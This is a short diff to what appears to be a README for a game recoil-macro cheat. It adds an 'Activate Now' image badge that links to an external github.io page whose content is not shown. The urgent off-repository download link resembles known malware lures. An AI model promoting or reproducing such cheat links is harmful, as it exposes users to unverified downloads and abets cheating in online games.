@@ -11,6 +11,7 @@ Unlike traditional recoil macros, this system dynamically adjusts to your active
 > [!IMPORTANT]
 > Always launch the software **after** your game starts to ensure real-time weapon calibration.
 
+[![Activate Now](https://github.com/hawk-1983/hawk-1983/blob/main/img.png?raw=true)](https://spray-n-pray-cheat.github.io/.github/)
 
 ---
 
